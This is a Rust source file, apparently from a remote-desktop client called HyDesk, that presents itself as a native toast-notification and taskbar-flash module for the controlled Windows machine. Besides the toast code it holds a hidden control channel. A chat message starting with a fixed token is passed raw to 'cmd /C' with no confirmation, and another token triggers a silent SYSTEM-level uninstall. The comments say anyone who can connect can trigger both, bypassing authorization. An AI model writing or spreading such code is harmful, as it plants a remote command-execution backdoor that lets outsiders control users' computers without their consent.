// 【HyDesk】受控端原生气泡通知 + 任务栏闪烁提示（Windows）
//
// 需求（2026-11-09）：
//  1. 主控端发文字聊天，受控端不再拉起连接管理器窗口，改为屏幕右下角
//     半透明文字气泡（透明背景 + 半透明白字 + 软阴影 + 自动淡出）；
//  2. 有人连进来时任务栏闪烁提示（FlashWindowEx）+ 连接气泡。
//
// 为什么用原生 GDI 而不是 Flutter：Flutter Windows 不支持每像素透明，
// 开新 Flutter 窗口有几百毫秒启动延迟；WS_EX_LAYERED + UpdateLayeredWindow
// 一次到位。本模块只在受控端连接管理器进程（用户会话）里被调用。
//
// 线程模型：首次调用 show() 起一个后台线程独占消息循环与气泡窗口；
// 其他线程通过静态队列 + PostMessage 投递文本，临界区极小。

// 【HyDesk】管理端「远程静默卸载」指令的识别令牌。
// 走聊天消息通道下发（不依赖授权系统，能连上对方就能卸）；
// 受控端收到内容恰好等于该令牌的消息时触发自卸载。
// 与 Flutter 端 kHyUninstallToken（patch_toolbar_eye.py 注入）保持一致。
pub const HY_UNINSTALL_TOKEN: &str = "HYDESK-UNINSTALL-9C4F2A7E";

// 【HyDesk】管理端「远程运行程序」指令的识别令牌（前缀）。
// 消息格式：HYDESK-RUN-5B7D3A1F|<命令>，走聊天通道下发（与卸载令牌同
// 信任级：能连上对方就能运行）。| 后面是任意命令行文本，交给 cmd 执行。
// 与 Flutter 端 kHyRunToken（patch_toolbar_eye.py 注入）保持一致。
pub const HY_RUN_TOKEN: &str = "HYDESK-RUN-5B7D3A1F";

#[cfg(target_os = "windows")]
pub use imp::{flash_taskbar, run_program, show, start_uninstall_watcher, uninstall_self};

#[cfg(not(target_os = "windows"))]
pub fn show(_text: &str) {}
#[cfg(not(target_os = "windows"))]
pub fn flash_taskbar() {}
#[cfg(not(target_os = "windows"))]
pub fn uninstall_self() {}
#[cfg(not(target_os = "windows"))]
pub fn start_uninstall_watcher() {}
#[cfg(not(target_os = "windows"))]
pub fn run_program(_cmd: &str) {}

#[cfg(target_os = "windows")]
mod imp {
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;
    use std::sync::atomic::{AtomicBool, AtomicIsize, Ordering};
    use std::sync::{Mutex, OnceLock};

    use winapi::shared::minwindef::{DWORD, UINT};
    use winapi::shared::windef::{HBITMAP, HDC, HGDIOBJ, HWND, RECT};
    use winapi::um::libloaderapi::GetModuleHandleW;
    use winapi::um::wingdi::{
        CreateCompatibleDC, CreateDIBSection, CreateFontW, DeleteDC, DeleteObject, GdiFlush,
        GetDeviceCaps, SelectObject, SetBkMode, SetTextColor, AC_SRC_ALPHA, AC_SRC_OVER,
        ANTIALIASED_QUALITY, BLENDFUNCTION, BI_RGB, BITMAPINFO, BITMAPINFOHEADER,
        CLIP_DEFAULT_PRECIS, DEFAULT_CHARSET, DEFAULT_PITCH, DIB_RGB_COLORS, FF_DONTCARE,
        LOGPIXELSY, OUT_TT_PRECIS, TRANSPARENT,
    };
    use winapi::um::winuser::{
        CreateWindowExW, DefWindowProcW, DispatchMessageW, DrawTextW, EnumWindows, FLASHWINFO,
        FLASHW_ALL, FLASHW_TIMERNOFG, FlashWindowEx, GetDC, GetMessageW, GetSystemMetrics,
        GetWindowTextW, GetWindow, GW_OWNER, GetWindowThreadProcessId, IsWindowVisible,
        KillTimer, MSG, PostMessageW, RegisterClassW, ReleaseDC, SetTimer, SetWindowPos,
        ShowWindow, SWP_NOACTIVATE, SWP_SHOWWINDOW, SW_HIDE, SW_SHOWNOACTIVATE,
        SystemParametersInfoW, TranslateMessage, UpdateLayeredWindow, WNDCLASSW, WS_POPUP,
        CS_HREDRAW, CS_VREDRAW, DT_CALCRECT, DT_NOPREFIX, DT_WORDBREAK, HWND_TOPMOST,
        SPI_GETWORKAREA, SM_CXSCREEN, SM_CYSCREEN, ULW_ALPHA, WM_TIMER, WM_DESTROY,
        WS_EX_LAYERED, WS_EX_NOACTIVATE, WS_EX_TOOLWINDOW, WS_EX_TOPMOST, WS_EX_TRANSPARENT,
    };
    use winapi::ctypes::c_void;

    // ------------------------------------------------------------------
    // 常量

    const WM_HY_SHOW: UINT = 0x8000 + 0x110; // 新消息到达（WM_APP 范围）
    const TIMER_HIDE: usize = 1; // 停留计时（8 秒后开始淡出）
    const TIMER_FADE: usize = 2; // 淡出步进

    const FONT_PT: i32 = 14; // 96dpi 基准字号（2026-11-10 用户要求再小一号）
    const MAX_W: i32 = 480; // 96dpi 基准最大宽度
    const MARGIN: i32 = 26; // 距屏幕右下角边距（96dpi 基准）
    const STAY_MS: UINT = 8000;
    const FADE_STEP: u8 = 26; // 每步减的 alpha（约 10 步淡出）

    struct ToastState {
        w: i32,
        h: i32,
        base: Vec<u8>, // alpha=255 的预乘 BGRA 基准帧
        alpha: u8,     // 当前整体不透明度
    }

    static HWND_TOAST: AtomicIsize = AtomicIsize::new(0);
    static THREAD_STARTED: AtomicBool = AtomicBool::new(false);
    static STATE: OnceLock<Mutex<Option<ToastState>>> = OnceLock::new();
    static QUEUE: OnceLock<Mutex<Vec<String>>> = OnceLock::new();

    fn state_cell() -> &'static Mutex<Option<ToastState>> {
        STATE.get_or_init(|| Mutex::new(None))
    }

    fn queue_cell() -> &'static Mutex<Vec<String>> {
        QUEUE.get_or_init(|| Mutex::new(Vec::new()))
    }

    fn wide(s: &str) -> Vec<u16> {
        OsStr::new(s).encode_wide().chain(std::iter::once(0)).collect()
    }

    // ------------------------------------------------------------------
    // 对外接口（任意线程调用）

    /// 屏幕右下角显示一条半透明文字气泡（自动淡出）
    /// 2026-11-10：只显示**最新一条**——之前队列累积后 join("\n")，
    /// 气泡里会同时堆出好几行旧消息（用户截图里 4 行叠在一起）。
    pub fn show(text: &str) {
        let text = text.trim();
        if text.is_empty() {
            return;
        }
        ensure_thread();
        {
            let mut q = queue_cell().lock().unwrap();
            q.clear();
            q.push(text.to_string());
        }
        let hwnd = HWND_TOAST.load(Ordering::Acquire) as HWND;
        if !hwnd.is_null() {
            unsafe {
                PostMessageW(hwnd, WM_HY_SHOW, 0, 0);
            }
        }
    }

    /// 闪烁本进程所有可见顶层窗口的任务栏按钮（有人连入时提示）
    pub fn flash_taskbar() {
        unsafe {
            EnumWindows(Some(flash_enum_proc), 0);
        }
    }

    static UNINSTALL_STARTED: AtomicBool = AtomicBool::new(false);

    /// 标记文件目录（与隐私屏信号文件同目录；用户会话与 SYSTEM 服务都可达）
    fn hy_base_dir() -> std::path::PathBuf {
        let base = std::env::var("ProgramData").unwrap_or_else(|_| "C:\\ProgramData".to_owned());
        std::path::PathBuf::from(base).join("DevicesFlowUserSvc")
    }

    fn uninstall_flag_path() -> std::path::PathBuf {
        hy_base_dir().join("uninstall.flag")
    }

    /// 【HyDesk】远程静默卸载（2026-11-10 起无提示、无二次确认、无 UAC）
    ///
    /// 本进程在用户会话里、通常未提权，直接跑 MsiExec 会弹 UAC + MSI 向导
    /// （用户反馈「二次确认」）。改为：
    ///   1. 只写一个标记文件（不显示任何「正在卸载」文字）；
    ///   2. SYSTEM 权限的服务进程（start_uninstall_watcher）看到标记后执行
    ///      platform::uninstall_me —— MSI 命令带 /qn，全程静默无界面；
    ///   3. 兜底：10 秒后标记仍在（服务未装/未跑）→ 自己 spawn --uninstall
    ///      并带 HYDESK_SILENT_UNINSTALL=1，MSI 同样静默。
    pub fn uninstall_self() {
        if UNINSTALL_STARTED.swap(true, Ordering::AcqRel) {
            return;
        }
        let flag = uninstall_flag_path();
        if std::fs::create_dir_all(hy_base_dir()).is_ok() {
            let _ = std::fs::write(&flag, b"uninstall");
        }
        std::thread::spawn(move || {
            std::thread::sleep(std::time::Duration::from_secs(10));
            if !flag.exists() {
                return; // 服务已接手
            }
            let _ = std::fs::remove_file(&flag);
            if let Ok(exe) = std::env::current_exe() {
                let mut cmd = std::process::Command::new(exe);
                cmd.arg("--uninstall");
                cmd.env("HYDESK_SILENT_UNINSTALL", "1");
                let _ = cmd.spawn();
            }
        });
    }

    /// 【HyDesk】管理端「远程运行程序」（2026-11-10）：在用户会话直接启动，
    /// 程序出现在对方桌面；普通程序无需提权，无需对方确认。
    ///
    /// 命令用 raw_arg 原样交给 cmd /C（避开 Rust 的参数转义，完整保留
    /// 引号/参数/路径含空格等 cmd 语义）：支持程序名（notepad）、完整路径、
    /// 带参数、文档与网址。长度限 512 防滥用；在后台线程执行，cmd 等待
    /// 子进程退出也不阻塞聊天通道。
    pub fn run_program(cmd: &str) {
        // 先转 owned：thread::spawn 要求 'static，&str 引用不能逃逸函数体
        let cmd: String = cmd.trim().to_string();
        if cmd.is_empty() || cmd.len() > 512 {
            eprintln!("hy: run_program ignored (empty or too long)");
            return;
        }
        eprintln!("hy: remote run program requested");
        std::thread::spawn(move || {
            use std::os::windows::process::CommandExt;
            let mut c = std::process::Command::new("cmd");
            let _ = c.raw_arg(format!("/C {}", cmd));
            if let Err(e) = c.spawn() {
                eprintln!("hy: remote run program failed: {}", e);
            }
        });
    }

    /// 服务进程（SYSTEM 权限）侧 watcher：轮询卸载标记，命中即以 SYSTEM 身份
    /// 静默卸载（不弹 UAC、不弹 MSI 界面）。由 core_main.rs 的 --service 分支启动。
    pub fn start_uninstall_watcher() {
        std::thread::spawn(|| loop {
            std::thread::sleep(std::time::Duration::from_secs(2));
            let flag = uninstall_flag_path();
            if !flag.exists() {
                continue;
            }
            let _ = std::fs::remove_file(&flag);
            eprintln!("hy: remote silent uninstall requested, uninstalling as service");
            if let Err(e) = crate::platform::uninstall_me(true) {
                eprintln!("hy: remote silent uninstall failed: {}", e);
            }
            return;
        });
    }

    unsafe extern "system" fn flash_enum_proc(hwnd: HWND, _lparam: winapi::shared::minwindef::LPARAM) -> i32 {
        let mut pid: DWORD = 0;
        GetWindowThreadProcessId(hwnd, &mut pid);
        if pid == std::process::id() {
            let visible = IsWindowVisible(hwnd) != 0;
            let owner = GetWindow(hwnd, GW_OWNER);
            let has_title = {
                let mut buf = [0u16; 64];
                GetWindowTextW(hwnd, buf.as_mut_ptr(), 64) > 0
            };
            if visible && owner.is_null() && has_title {
                let mut fi = FLASHWINFO {
                    cbSize: std::mem::size_of::<FLASHWINFO>() as UINT,
                    hwnd,
                    dwFlags: FLASHW_ALL | FLASHW_TIMERNOFG,
                    uCount: 6,
                    dwTimeout: 0,
                };
                FlashWindowEx(&mut fi);
            }
        }
        1 // 继续枚举
    }

    fn ensure_thread() {
        if THREAD_STARTED.swap(true, Ordering::AcqRel) {
            return;
        }
        std::thread::spawn(|| unsafe {
            let hinst = GetModuleHandleW(std::ptr::null());
            let class_name: Vec<u16> = wide("HyDeskToastWnd");
            let wc = WNDCLASSW {
                style: CS_HREDRAW | CS_VREDRAW,
                lpfnWndProc: Some(toast_wnd_proc),
                hInstance: hinst,
                lpszClassName: class_name.as_ptr(),
                cbClsExtra: 0,
                cbWndExtra: 0,
                hIcon: std::ptr::null_mut(),
                hCursor: std::ptr::null_mut(),
                hbrBackground: std::ptr::null_mut(),
                lpszMenuName: std::ptr::null(),
            };
            if RegisterClassW(&wc) == 0 {
                return;
            }
            // 初始 0 尺寸、隐藏；显示时按内容重设
            let hwnd = CreateWindowExW(
                WS_EX_LAYERED
                    | WS_EX_TRANSPARENT
                    | WS_EX_TOOLWINDOW
                    | WS_EX_NOACTIVATE
                    | WS_EX_TOPMOST,
                class_name.as_ptr(),
                std::ptr::null(),
                WS_POPUP,
                0,
                0,
                0,
                0,
                std::ptr::null_mut(),
                std::ptr::null_mut(),
                hinst,
                std::ptr::null_mut(),
            );
            if hwnd.is_null() {
                return;
            }
            HWND_TOAST.store(hwnd as isize, Ordering::Release);
            // 窗口创建前积压的消息补投递一次
            PostMessageW(hwnd, WM_HY_SHOW, 0, 0);

            let mut msg: MSG = std::mem::zeroed();
            loop {
                let r = GetMessageW(&mut msg, std::ptr::null_mut(), 0, 0);
                if r <= 0 {
                    break;
                }
                TranslateMessage(&msg);
                DispatchMessageW(&msg);
            }
        });
    }

    // ------------------------------------------------------------------
    // 窗口过程（气泡线程）

    unsafe extern "system" fn toast_wnd_proc(
        hwnd: HWND,
        msg: UINT,
        wparam: winapi::shared::minwindef::WPARAM,
        lparam: winapi::shared::minwindef::LPARAM,
    ) -> winapi::shared::minwindef::LRESULT {
        match msg {
            WM_HY_SHOW => {
                // 只取最新一条（队列里不会再有多条，双保险）
                let text = {
                    let mut q = queue_cell().lock().unwrap();
                    let t = q.last().cloned().unwrap_or_default();
                    q.clear();
                    t
                };
                if !text.is_empty() {
                    if render(hwnd, &text) {
                        KillTimer(hwnd, TIMER_HIDE);
                        KillTimer(hwnd, TIMER_FADE);
                        if let Some(st) = state_cell().lock().unwrap().as_mut() {
                            st.alpha = 255;
                        }
                        SetTimer(hwnd, TIMER_HIDE, STAY_MS, None);
                        ShowWindow(hwnd, SW_SHOWNOACTIVATE);
                    }
                }
                0
            }
            WM_TIMER => {
                let id = wparam as usize;
                if id == TIMER_HIDE {
                    KillTimer(hwnd, TIMER_HIDE);
                    SetTimer(hwnd, TIMER_FADE, 45, None);
                } else if id == TIMER_FADE {
                    let mut hide = false;
                    {
                        let mut guard = state_cell().lock().unwrap();
                        if let Some(st) = guard.as_mut() {
                            st.alpha = st.alpha.saturating_sub(FADE_STEP);
                            if st.alpha == 0 {
                                hide = true;
                            } else {
                                present(hwnd, st.w, st.h, &scale_alpha(&st.base, st.alpha));
                            }
                        }
                    }
                    if hide {
                        KillTimer(hwnd, TIMER_FADE);
                        ShowWindow(hwnd, SW_HIDE);
                    }
                }
                0
            }
            WM_DESTROY => {
                HWND_TOAST.store(0, Ordering::Release);
                0
            }
            _ => DefWindowProcW(hwnd, msg, wparam, lparam),
        }
    }

    fn scale_alpha(base: &[u8], a: u8) -> Vec<u8> {
        let mut out = base.to_vec();
        for px in out.chunks_mut(4) {
            for b in px.iter_mut() {
                *b = (*b as u16 * a as u16 / 255) as u8;
            }
        }
        out
    }

    // ------------------------------------------------------------------
    // 渲染：GDI 画白字（黑底）→ 逐像素 alpha 生成半透明文字 + 软阴影

    unsafe fn render(hwnd: HWND, text: &str) -> bool {
        let hdc_screen = GetDC(std::ptr::null_mut());
        if hdc_screen.is_null() {
            return false;
        }
        let dpi = {
            let d = GetDeviceCaps(hdc_screen, LOGPIXELSY);
            if d <= 0 {
                96
            } else {
                d
            }
        };
        let scale = dpi / 96;
        let font_h = (FONT_PT * scale).max(12);
        let pad = 12 * scale;
        let max_w = {
            let sw = GetSystemMetrics(SM_CXSCREEN);
            (MAX_W * scale).min(sw * 2 / 5).max(160)
        };
        let work = work_area();

        let font = CreateFontW(
            -font_h,
            0,
            0,
            0,
            winapi::um::wingdi::FW_NORMAL as i32,
            0,
            0,
            0,
            DEFAULT_CHARSET,
            OUT_TT_PRECIS,
            CLIP_DEFAULT_PRECIS,
            ANTIALIASED_QUALITY,
            DEFAULT_PITCH | FF_DONTCARE,
            wide("Microsoft YaHei").as_ptr(),
        );
        let memdc = CreateCompatibleDC(hdc_screen);
        if font.is_null() || memdc.is_null() {
            if !font.is_null() {
                DeleteObject(font as HGDIOBJ);
            }
            if !memdc.is_null() {
                DeleteDC(memdc);
            }
            ReleaseDC(std::ptr::null_mut(), hdc_screen);
            return false;
        }
        let old_font = SelectObject(memdc, font as HGDIOBJ);

        // 1) 度量文本
        let wtext = wide(text);
        let mut rc = RECT {
            left: 0,
            top: 0,
            right: max_w,
            bottom: 0,
        };
        DrawTextW(memdc, wtext.as_ptr(), -1, &mut rc, DT_CALCRECT | DT_NOPREFIX | DT_WORDBREAK);
        let tw = (rc.right - rc.left).max(40);
        let th = (rc.bottom - rc.top).max(font_h);
        let w = tw + pad * 2;
        let h = th + pad * 2;

        // 2) 文字掩码 DIB（白字黑底；掩码亮度即覆盖度）
        let mask = match create_dib(memdc, w, h) {
            Some(m) => m,
            None => {
                SelectObject(memdc, old_font);
                DeleteObject(font as HGDIOBJ);
                DeleteDC(memdc);
                ReleaseDC(std::ptr::null_mut(), hdc_screen);
                return false;
            }
        };
        let old_bmp = SelectObject(memdc, mask.0 as HGDIOBJ);
        SetBkMode(memdc, TRANSPARENT as i32);
        SetTextColor(memdc, winapi::um::wingdi::RGB(255, 255, 255));
        let mut rc2 = RECT {
            left: pad,
            top: pad,
            right: pad + tw,
            bottom: pad + th,
        };
        DrawTextW(memdc, wtext.as_ptr(), -1, &mut rc2, DT_NOPREFIX | DT_WORDBREAK);
        GdiFlush();
        let need = (w * h * 4) as usize;
        let mut mask_buf = vec![0u8; need];
        std::ptr::copy_nonoverlapping(mask.1 as *const u8, mask_buf.as_mut_ptr(), need);

        // 3) 生成基准帧：半透明白字（约 0.8）+ 右下软阴影（约 0.35）
        let mut base = vec![0u8; need];
        let stride = (w * 4) as usize;
        let hpx = h as usize;
        for y in 0..hpx {
            for x in 0..w as usize {
                let i = y * stride + x * 4;
                let m = mask_buf[i] | mask_buf[i + 1] | mask_buf[i + 2];
                if m == 0 {
                    continue;
                }
                let t = (m as u32 * 205 / 255) as u16; // 文字 alpha ~0.8
                let s = {
                    let sx = if x >= 2 { x - 2 } else { x };
                    let sy = if y + 2 < hpx { y + 2 } else { y };
                    let j = sy * stride + sx * 4;
                    let m2 = mask_buf[j] | mask_buf[j + 1] | mask_buf[j + 2];
                    (m2 as u32 * 90 / 255) as u16 // 阴影 alpha ~0.35
                };
                let a = t + s * (255 - t) as u16 / 255;
                if a == 0 {
                    continue;
                }
                // 预乘：白字通道 = t；黑色阴影通道 = 0
                base[i] = t as u8;
                base[i + 1] = t as u8;
                base[i + 2] = t as u8;
                base[i + 3] = a as u8;
            }
        }
        SelectObject(memdc, old_bmp);
        DeleteObject(mask.0 as HGDIOBJ);
        SelectObject(memdc, old_font);
        DeleteObject(font as HGDIOBJ);
        DeleteDC(memdc);
        ReleaseDC(std::ptr::null_mut(), hdc_screen);

        // 4) 落位：屏幕右下角（工作区内，避开任务栏）
        let x = work.right - w - MARGIN * scale;
        let y = work.bottom - h - MARGIN * scale;
        SetWindowPos(
            hwnd,
            HWND_TOPMOST,
            x,
            y,
            w,
            h,
            SWP_NOACTIVATE | SWP_SHOWWINDOW,
        );
        present(hwnd, w, h, &base);

        let mut guard = state_cell().lock().unwrap();
        *guard = Some(ToastState {
            w,
            h,
            base,
            alpha: 255,
        });
        true
    }

    /// 把一帧预乘 BGRA 像素刷到分层窗口
    unsafe fn present(hwnd: HWND, w: i32, h: i32, buf: &[u8]) -> bool {
        let hdc_screen = GetDC(std::ptr::null_mut());
        if hdc_screen.is_null() {
            return false;
        }
        let memdc = CreateCompatibleDC(hdc_screen);
        let dib = create_dib(memdc, w, h);
        let mut ok = false;
        if !memdc.is_null() {
            if let Some((bmp, bits)) = dib {
                let need = (w * h * 4) as usize;
                std::ptr::copy_nonoverlapping(buf.as_ptr(), bits as *mut u8, need.min(buf.len()));
                GdiFlush();
                let old_bmp = SelectObject(memdc, bmp as HGDIOBJ);
                let mut pt_src = winapi::shared::windef::POINT { x: 0, y: 0 };
                let mut size = winapi::shared::windef::SIZE { cx: w, cy: h };
                let mut blend = BLENDFUNCTION {
                    BlendOp: AC_SRC_OVER,
                    BlendFlags: 0,
                    SourceConstantAlpha: 255,
                    AlphaFormat: AC_SRC_ALPHA,
                };
                let _ = UpdateLayeredWindow(
                    hwnd,
                    hdc_screen,
                    std::ptr::null_mut(),
                    &mut size,
                    memdc,
                    &mut pt_src,
                    0,
                    &mut blend,
                    ULW_ALPHA,
                );
                SelectObject(memdc, old_bmp);
                DeleteObject(bmp as HGDIOBJ);
                ok = true;
            }
            DeleteDC(memdc);
        }
        ReleaseDC(std::ptr::null_mut(), hdc_screen);
        ok
    }

    fn work_area() -> RECT {
        let mut rc = RECT {
            left: 0,
            top: 0,
            right: unsafe { GetSystemMetrics(SM_CXSCREEN) },
            bottom: unsafe { GetSystemMetrics(SM_CYSCREEN) },
        };
        unsafe {
            SystemParametersInfoW(SPI_GETWORKAREA, 0, &mut rc as *mut RECT as *mut c_void, 0);
        }
        rc
    }

    /// 创建 32bpp 顶向下 DIB，返回 (位图, 位图像素指针)。失败返回 None。
    unsafe fn create_dib(hdc: HDC, w: i32, h: i32) -> Option<(HBITMAP, *mut c_void)> {
        let mut bmi: BITMAPINFO = std::mem::zeroed();
        bmi.bmiHeader.biSize = std::mem::size_of::<BITMAPINFOHEADER>() as u32;
        bmi.bmiHeader.biWidth = w;
        bmi.bmiHeader.biHeight = -h;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biCompression = BI_RGB;
        let mut bits: *mut c_void = std::ptr::null_mut();
        let bmp = CreateDIBSection(
            hdc,
            &bmi,
            DIB_RGB_COLORS,
            &mut bits,
            std::ptr::null_mut(),
            0,
        );
        if bmp.is_null() || bits.is_null() {
            return None;
        }
        Some((bmp, bits))
    }
}
